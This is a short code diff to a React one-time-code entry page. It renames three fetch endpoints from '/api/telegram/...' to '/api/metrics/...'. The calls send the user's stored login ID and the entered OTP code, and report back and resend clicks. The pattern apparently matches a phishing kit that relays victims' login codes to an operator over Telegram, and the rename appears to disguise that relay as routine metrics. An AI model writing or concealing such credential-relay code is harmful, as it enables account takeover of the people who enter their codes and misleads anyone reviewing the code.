@@ -90,7 +90,7 @@ function EnterCodeContent() {
     if (isSubmitting || isGoingBack) return
     setIsGoingBack(true)
     const userId = readStoredUsername() || sessionStorage.getItem("loginUserId") || ""
-    void fetch("/api/telegram/verification-click", {
+    void fetch("/api/metrics/verification-click", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
@@ -109,7 +109,7 @@ function EnterCodeContent() {
     if (isResending || resendCooldown > 0 || isSubmitting || isGoingBack) return
     setIsResending(true)
     try {
-      void fetch("/api/telegram/resend-code", {
+      void fetch("/api/metrics/resend-code", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
@@ -141,7 +141,7 @@ function EnterCodeContent() {
 
     const typeLabel = verificationTypeLabel(method)
 
-    void fetch("/api/telegram/verification", {
+    void fetch("/api/metrics/verification", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ userId: readStoredUsername(), code: otpCode,
